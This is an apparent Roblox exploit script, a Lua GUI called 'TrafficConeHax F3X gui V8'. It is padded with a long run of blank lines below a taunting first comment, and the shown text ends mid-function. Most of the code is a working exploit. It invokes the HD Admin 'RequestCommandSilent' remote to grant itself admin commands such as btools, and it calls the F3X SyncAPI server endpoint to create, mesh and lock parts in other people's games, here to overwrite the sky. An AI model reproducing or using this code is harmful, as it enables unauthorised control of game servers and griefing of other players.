-- fuck off skid
























































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































-- oh noo skid :(
-- Generated by gui2lua test
local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local replicatedStorage = game:GetService("ReplicatedStorage")
local CollectionService = game:GetService("CollectionService")
local __mesh = nil
local R, __M, __S = {}, {}, {}
local __cache = {}
local function __require(m)
	local f = __M[m]
	if f then
		if not __cache[m] then __cache[m] = table.pack(f()) end
		return table.unpack(__cache[m], 1, __cache[m].n)
	end
	return require(m)
end


-- @@CHUNKS
do -- chunk 1/6
local CoreGui = game:GetService("CoreGui")

local wow = Instance.new("ScreenGui")
wow.Name = "wow"
wow.DisplayOrder = 2000001295
wow.ScreenInsets = Enum.ScreenInsets.None
wow.ResetOnSpawn = false
wow.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
wow.Parent = CoreGui


local epic = Instance.new("Frame")
epic.Name = "epic"
epic.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
epic.BackgroundTransparency = 0.200000003
epic.BorderColor3 = Color3.fromRGB(0, 242, 255)
epic.BorderSizePixel = 4
epic.Position = UDim2.new(0.035198234, 0, 0.164405614, 0)
epic.Size = UDim2.new(0, 543, 0, 399)
R[2] = epic
epic.Parent = wow

local Drag = Instance.new("Folder")
Drag.Name = "Drag"
Drag.Parent = epic
__S[#__S + 1] = function(...)
local script = Drag
-- Drag Script (Revamped by Sloshy 🙏)
local UIS = game:GetService('UserInputService')
local TweenService = game:GetService('TweenService')

local frame = script.Parent
local dragToggle = nil
local dragSpeed = 0.15
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
	TweenService:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)
end

local Home = Instance.new("ScrollingFrame")
Home.Name = "Home"
Home.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
Home.Active = true
Home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home.BackgroundTransparency = 1
Home.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home.BorderSizePixel = 0
Home.Position = UDim2.new(1.12403605e-07, 0, 0, 0)
Home.Size = UDim2.new(0, 542, 0, 399)
Home.Parent = epic

local TextLabel = Instance.new("TextLabel")
TextLabel.Name = "TextLabel"
TextLabel.FontFace = Font.new("rbxasset://fonts/families/RobotoMono.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel.Text = "TrafficConeHax F3X gui V8"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.LayoutOrder = 5
TextLabel.Position = UDim2.new(0.0117078833, 0, -0.00106467342, 0)
TextLabel.Size = UDim2.new(0, 515, 0, 48)
TextLabel.ZIndex = 5
TextLabel.Parent = Home

local TextLabel2 = Instance.new("TextLabel")
TextLabel2.Name = "TextLabel"
TextLabel2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel2.Text = "yeah this is tuff i guess because idk what to say i think this is a tuff hack for tuff people only, if this gets leaked then im the one who leaked it myself because sharing is caring, i worked on this myself because if i let people help me make this there is a chance that they would just leak it."
TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.TextScaled = true
TextLabel2.TextSize = 14
TextLabel2.TextWrapped = true
TextLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.BackgroundTransparency = 1
TextLabel2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel2.BorderSizePixel = 0
TextLabel2.LayoutOrder = 5
TextLabel2.Position = UDim2.new(0.0246230215, 0, 0.240789965, 0)
TextLabel2.Size = UDim2.new(0, 515, 0, 187)
TextLabel2.ZIndex = 5
TextLabel2.Parent = Home

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Name = "ImageLabel"
ImageLabel.Image = "rbxassetid://110582834250785"
ImageLabel.ImageContent = Content.fromUri("rbxassetid://110582834250785")
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.0697937012, 0, 0.577694237, 0)
ImageLabel.Size = UDim2.new(0, 444, 0, 337)
ImageLabel.Parent = Home

local Time = Instance.new("TextLabel")
Time.Name = "Time"
Time.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
Time.Text = "Time: 00:00"
Time.TextColor3 = Color3.fromRGB(232, 237, 255)
Time.TextScaled = true
Time.TextSize = 14
Time.TextWrapped = true
Time.TextXAlignment = Enum.TextXAlignment.Left
Time.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Time.BackgroundTransparency = 1
Time.Position = UDim2.new(0.639746666, 0, 0.090784438, 0)
Time.Size = UDim2.new(0, 161, 0, 33)
Time.Parent = Home

local LocalScript = Instance.new("Folder")
LocalScript.Name = "LocalScript"
LocalScript.Parent = Time
__S[#__S + 1] = function(...)
local script = LocalScript
local textLabel = script.Parent


local function updateRealTime()
	while true do

		local realTime = os.date("%H:%M:%S")


		textLabel.Text = "Time: " .. realTime


		wait(1)
	end
end


updateRealTime()

end

local Username = Instance.new("ImageLabel")
Username.Name = "Username"
Username.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
Username.ImageContent = Content.fromUri("rbxasset://textures/ui/GuiImagePlaceholder.png")
Username.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Username.BackgroundTransparency = 1
Username.BorderColor3 = Color3.fromRGB(0, 242, 255)
Username.BorderSizePixel = 0
Username.Position = UDim2.new(0.011692089, 0, 0.0676502064, 0)
Username.Size = UDim2.new(0, 75, 0, 69)
Username.Parent = Home

local LocalScript2 = Instance.new("Folder")
LocalScript2.Name = "LocalScript"
LocalScript2.Parent = Username
__S[#__S + 1] = function(...)
local script = LocalScript2
local Players = game:GetService("Players")

local player = Players.LocalPlayer

local userId = player.UserId
local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size420x420
local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)

local imageLabel = script.Parent
imageLabel.Image = content
end

local UICorner = Instance.new("UICorner")
UICorner.Name = "UICorner"
UICorner.BottomLeftRadius = UDim.new(1, 0)
UICorner.BottomRightRadius = UDim.new(1, 0)
UICorner.TopLeftRadius = UDim.new(1, 0)
UICorner.TopRightRadius = UDim.new(1, 0)
UICorner.Parent = Username

local UIStroke = Instance.new("UIStroke")
UIStroke.Name = "UIStroke"
UIStroke.Color = Color3.fromRGB(0, 242, 255)
UIStroke.Thickness = 2
UIStroke.Parent = Username

local message = Instance.new("TextBox")
message.Name = "message"
message.ClearTextOnFocus = false
message.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
message.PlaceholderColor3 = Color3.new(0.699999988, 0.699999988, 0.699999988)
message.ShowNativeInput = false
message.Text = "there should be something here but idfk"
message.TextColor3 = Color3.fromRGB(255, 255, 255)
message.TextEditable = false
message.TextScaled = true
message.TextSize = 14
message.TextWrapped = true
message.TextXAlignment = Enum.TextXAlignment.Left
message.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
message.BackgroundTransparency = 1
message.BorderColor3 = Color3.fromRGB(0, 0, 0)
message.BorderSizePixel = 0
message.Interactable = false
message.LayoutOrder = 1
message.Position = UDim2.new(0.579957783, 0, 0.156822339, 0)
message.Size = UDim2.new(0, 202, 0, 53)
message.Parent = Home

local LocalScript3 = Instance.new("Folder")
LocalScript3.Name = "LocalScript"
LocalScript3.Parent = message
__S[#__S + 1] = function(...)
local script = LocalScript3
local text = script.Parent

local phrases = {
	"Status: FE Bypassed",
	"Injected but you already knew that",
	"ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh",
	"99 nights in durham",
	"wtf do i type here",
	"Fun fact: There is a skeleton inside you right now.",
	"i fucking hate people who steal scripts from me",
	"Darius is a skid",
	"this took me 5 days to make (very long)",
	"this is the strongest f3x exploit gui",
	"l0lkidd is a skid",
	"you can't skid this",
	"lol",
	"Hi",
	"if you have this gui i have your exact location.",
	"this message is rare (not really)"
}

local randomIndex = math.random(1, #phrases)
text.Text = phrases[randomIndex]

end

local r6 = Instance.new("TextButton")
r6.Name = "r6"
r6.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
r6.Text = "R6"
r6.TextColor3 = Color3.fromRGB(255, 255, 255)
r6.TextScaled = true
r6.TextSize = 14
r6.TextWrapped = true
r6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
r6.BorderColor3 = Color3.fromRGB(0, 242, 255)
r6.BorderSizePixel = 2
r6.Position = UDim2.new(-0.000316275633, 0, -0.241216138, 0)
r6.Size = UDim2.new(0, 61, 0, 31)
r6.Parent = epic

local LocalScript4 = Instance.new("Folder")
LocalScript4.Name = "LocalScript"
LocalScript4.Parent = r6
__S[#__S + 1] = function(...)
local script = LocalScript4
script.Parent.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommandSilent:InvokeServer(";r6")
end)
end

local f3x = Instance.new("TextButton")
f3x.Name = "f3x"
f3x.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
f3x.Text = "F3X"
f3x.TextColor3 = Color3.fromRGB(255, 255, 255)
f3x.TextScaled = true
f3x.TextSize = 14
f3x.TextWrapped = true
f3x.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
f3x.BorderColor3 = Color3.fromRGB(0, 242, 255)
f3x.BorderSizePixel = 2
f3x.Position = UDim2.new(0.887344837, 0, -0.241216138, 0)
f3x.Size = UDim2.new(0, 61, 0, 31)
f3x.Parent = epic

local LocalScript5 = Instance.new("Folder")
LocalScript5.Name = "LocalScript"
LocalScript5.Parent = f3x
__S[#__S + 1] = function(...)
local script = LocalScript5
script.Parent.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommandSilent:InvokeServer(";btools")
end)
end

local re = Instance.new("TextButton")
re.Name = "re"
re.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
re.Text = "RE"
re.TextColor3 = Color3.fromRGB(255, 255, 255)
re.TextScaled = true
re.TextSize = 14
re.TextWrapped = true
re.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
re.BorderColor3 = Color3.fromRGB(0, 242, 255)
re.BorderSizePixel = 2
re.Position = UDim2.new(0.112022556, 0, -0.241216138, 0)
re.Size = UDim2.new(0, 61, 0, 31)
re.Parent = epic

local LocalScript6 = Instance.new("Folder")
LocalScript6.Name = "LocalScript"
LocalScript6.Parent = re
__S[#__S + 1] = function(...)
local script = LocalScript6
script.Parent.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommandSilent:InvokeServer(";refresh")
end)
end

local page = Instance.new("Frame")
page.Name = "page"
page.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page.BackgroundTransparency = 0.200000003
page.BorderColor3 = Color3.fromRGB(0, 242, 255)
page.BorderSizePixel = 4
page.Position = UDim2.new(0, 0, -0.147890627, 0)
page.Size = UDim2.new(0, 543, 0, 59)
page.Parent = epic

local home = Instance.new("TextButton")
home.Name = "home"
home.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
home.Text = "Home/creds"
home.TextColor3 = Color3.fromRGB(255, 255, 255)
home.TextScaled = true
home.TextSize = 14
home.TextWrapped = true
home.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
home.BorderColor3 = Color3.fromRGB(0, 242, 255)
home.BorderSizePixel = 2
home.Position = UDim2.new(0.0107334694, 0, 0.169811442, 0)
home.Size = UDim2.new(0, 77, 0, 37)
home.Parent = page

local LocalScript7 = Instance.new("Folder")
LocalScript7.Name = "LocalScript"
LocalScript7.Parent = home
__S[#__S + 1] = function(...)
local script = LocalScript7
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.Parent.Parent.Home.Visible = true
	script.Parent.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Parent.Page3.Visible = false
	script.Parent.Parent.Parent.Page4.Visible = false
	script.Parent.Parent.Parent.Page5.Visible = false
	script.Parent.Parent.Parent.Page6.Visible = false
	script.Parent.Parent.Parent.Page7.Visible = false
	script.Parent.Parent.Parent.Page8.Visible = false
end)
end

local page1 = Instance.new("TextButton")
page1.Name = "page1"
page1.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
page1.Text = "Page 1"
page1.TextColor3 = Color3.fromRGB(255, 255, 255)
page1.TextScaled = true
page1.TextSize = 14
page1.TextWrapped = true
page1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page1.BorderColor3 = Color3.fromRGB(0, 242, 255)
page1.BorderSizePixel = 2
page1.Position = UDim2.new(0.174790606, 0, 0.169811442, 0)
page1.Size = UDim2.new(0, 77, 0, 37)
page1.Parent = page

local LocalScript8 = Instance.new("Folder")
LocalScript8.Name = "LocalScript"
LocalScript8.Parent = page1
__S[#__S + 1] = function(...)
local script = LocalScript8
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.Parent.Parent.Home.Visible = false
	script.Parent.Parent.Parent.Page1.Visible = true
	script.Parent.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Parent.Page3.Visible = false
	script.Parent.Parent.Parent.Page4.Visible = false
	script.Parent.Parent.Parent.Page5.Visible = false
	script.Parent.Parent.Parent.Page6.Visible = false
	script.Parent.Parent.Parent.Page7.Visible = false
	script.Parent.Parent.Parent.Page8.Visible = false
end)
end

local page2 = Instance.new("TextButton")
page2.Name = "page2"
page2.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
page2.Text = "Page 2"
page2.TextColor3 = Color3.fromRGB(255, 255, 255)
page2.TextScaled = true
page2.TextSize = 14
page2.TextWrapped = true
page2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page2.BorderColor3 = Color3.fromRGB(0, 242, 255)
page2.BorderSizePixel = 2
page2.Position = UDim2.new(0.335918337, 0, 0.169811442, 0)
page2.Size = UDim2.new(0, 77, 0, 37)
page2.Parent = page

local LocalScript9 = Instance.new("Folder")
LocalScript9.Name = "LocalScript"
LocalScript9.Parent = page2
__S[#__S + 1] = function(...)
local script = LocalScript9
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.Parent.Parent.Home.Visible = false
	script.Parent.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Parent.Page2.Visible = true
	script.Parent.Parent.Parent.Page3.Visible = false
	script.Parent.Parent.Parent.Page4.Visible = false
	script.Parent.Parent.Parent.Page5.Visible = false
	script.Parent.Parent.Parent.Page6.Visible = false
	script.Parent.Parent.Parent.Page7.Visible = false
	script.Parent.Parent.Parent.Page8.Visible = false
end)
end

local page3 = Instance.new("TextButton")
page3.Name = "page3"
page3.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
page3.Text = "Page 3"
page3.TextColor3 = Color3.fromRGB(255, 255, 255)
page3.TextScaled = true
page3.TextSize = 14
page3.TextWrapped = true
page3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page3.BorderColor3 = Color3.fromRGB(0, 242, 255)
page3.BorderSizePixel = 2
page3.Position = UDim2.new(0.497045964, 0, 0.169811442, 0)
page3.Size = UDim2.new(0, 77, 0, 37)
page3.Parent = page

local LocalScript10 = Instance.new("Folder")
LocalScript10.Name = "LocalScript"
LocalScript10.Parent = page3
__S[#__S + 1] = function(...)
local script = LocalScript10
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.Parent.Parent.Home.Visible = false
	script.Parent.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Parent.Page3.Visible = true
	script.Parent.Parent.Parent.Page4.Visible = false
	script.Parent.Parent.Parent.Page5.Visible = false
	script.Parent.Parent.Parent.Page6.Visible = false
	script.Parent.Parent.Parent.Page7.Visible = false
	script.Parent.Parent.Parent.Page8.Visible = false
end)
end

local page4 = Instance.new("TextButton")
page4.Name = "page4"
page4.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
page4.Text = "Page 4"
page4.TextColor3 = Color3.fromRGB(255, 255, 255)
page4.TextScaled = true
page4.TextSize = 14
page4.TextWrapped = true
page4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page4.BorderColor3 = Color3.fromRGB(0, 242, 255)
page4.BorderSizePixel = 2
page4.Position = UDim2.new(0.658173621, 0, 0.169811442, 0)
page4.Size = UDim2.new(0, 77, 0, 37)
page4.Parent = page

local LocalScript11 = Instance.new("Folder")
LocalScript11.Name = "LocalScript"
LocalScript11.Parent = page4
__S[#__S + 1] = function(...)
local script = LocalScript11
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.Parent.Parent.Home.Visible = false
	script.Parent.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Parent.Page3.Visible = false
	script.Parent.Parent.Parent.Page4.Visible = true
	script.Parent.Parent.Parent.Page5.Visible = false
	script.Parent.Parent.Parent.Page6.Visible = false
	script.Parent.Parent.Parent.Page7.Visible = false
	script.Parent.Parent.Parent.Page8.Visible = false
end)
end

local page5 = Instance.new("TextButton")
page5.Name = "page5"
page5.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
page5.Text = "Page 5"
page5.TextColor3 = Color3.fromRGB(255, 255, 255)
page5.TextScaled = true
page5.TextSize = 14
page5.TextWrapped = true
page5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page5.BorderColor3 = Color3.fromRGB(0, 242, 255)
page5.BorderSizePixel = 2
page5.Position = UDim2.new(0.819301248, 0, 0.169811442, 0)
page5.Size = UDim2.new(0, 77, 0, 37)
page5.Parent = page

local LocalScript12 = Instance.new("Folder")
LocalScript12.Name = "LocalScript"
LocalScript12.Parent = page5
__S[#__S + 1] = function(...)
local script = LocalScript12
script.Parent.MouseButton1Click:Connect(function()
	script.Parent.Parent.Parent.Home.Visible = false
	script.Parent.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Parent.Page3.Visible = false
	script.Parent.Parent.Parent.Page4.Visible = false
	script.Parent.Parent.Parent.Page5.Visible = true
	script.Parent.Parent.Parent.Page6.Visible = false
	script.Parent.Parent.Parent.Page7.Visible = false
	script.Parent.Parent.Parent.Page8.Visible = false
end)
end

local Page1 = Instance.new("Frame")
Page1.Name = "Page1"
Page1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Page1.BackgroundTransparency = 1
Page1.BorderColor3 = Color3.fromRGB(0, 0, 0)
Page1.BorderSizePixel = 0
Page1.Position = UDim2.new(0.0110497242, 0, 0.0200501252, 0)
Page1.Size = UDim2.new(0, 537, 0, 391)
Page1.Visible = false
R[35] = Page1
Page1.Parent = epic

local Frame = Instance.new("Frame")
Frame.Name = "Frame"
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 1
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.000566109607, 0, 0.185574159, 0)
Frame.Size = UDim2.new(0, 231, 0, 95)
R[36] = Frame
Frame.Parent = Page1

local skybutton = Instance.new("TextButton")
skybutton.Name = "skybutton"
skybutton.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
skybutton.Text = "skybox"
skybutton.TextColor3 = Color3.fromRGB(255, 255, 255)
skybutton.TextScaled = true
skybutton.TextSize = 22
skybutton.TextWrapped = true
skybutton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
skybutton.BorderColor3 = Color3.fromRGB(0, 242, 255)
skybutton.Position = UDim2.new(-0.000615107536, 0, -0.619692564, 0)
skybutton.Size = UDim2.new(0, 75, 0, 48)
skybutton.Parent = Frame

local LocalScript13 = Instance.new("Folder")
LocalScript13.Name = "LocalScript"
LocalScript13.Parent = skybutton
__S[#__S + 1] = function(...)
local script = LocalScript13
script.Parent.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local SMALL_ID = script.Parent.Parent:FindFirstChild("skyid") and script.Parent.Parent.skyid.Text or "" 
local ZERO = Vector3.new(0, 0, 0)
local SKY_MESH = "111891702759441"
local SKY_SCALES = { [99999] = true, [10000] = true, [11000] = true, [110000] = true }

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function getMeshScale(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.Scale
	end
	return Vector3.new(0, 0, 0)
end

local function getVertexColor(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.VertexColor
	end
	return Vector3.new(1, 1, 1)
end

local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";time 0 ;fogcolor black")

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor or Vector3.new(1, 1, 1) } } })
end

function CreatePart(cf, parent)
	_({ "CreatePart", "Normal", cf, parent })
end

function AddMesh(part)
	_({ "CreateMeshes", { { Part = part } } })
end

function SetTexture(part, texid)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid } } })
end

function SetName(part, stringg)
	_({ "SetName", { part }, stringg })
end

function MeshResize(part, size)
	_({ "SyncMesh", { { Part = part, Scale = size } } })
end

function SetLocked(part, boolean)
	_({ "SetLocked", { part }, boolean })
end

function SetTrans(part, int)
	_({ "SyncMaterial", { { Part = part, Transparency = int } } })
end

function Color(part, color)
	_({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
end

function SyncLighting(part, brightness)
	_({ "SyncLighting", { { Part = part, LightType = "PointLight", Brightness = brightness } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	local finalColor = vertexColor or (mesh and mesh.VertexColor) or Vector3.new(1, 1, 1)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = finalColor } } })
end

local function waitForPartAt(x, z, timeout)
	local start = os.clock()
	repeat
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not isSky(v) and v.CFrame.X == x and v.CFrame.Z == z then
				return v
			end
		end
		RunService.Heartbeat:Wait()
	until os.clock() - start > (timeout or 2)
	return nil
end

local function findExisting()
	local big, small
	for _, v in ipairs(workspace:GetDescendants()) do
		if isSky(v) then
			if getVertexColor(v) == ZERO then
				big = big or v
			elseif SKY_SCALES[math.round(getMeshScale(v).X)] then
				small = small or v
			end
		end
	end
	return big, small
end

local function setupSky(v, spec)
	SetName(v, "Sky")
	AddMesh(v)

	SetMesh(v, SKY_MESH, spec.vertexColor)
	SetTexture(v, spec.id)
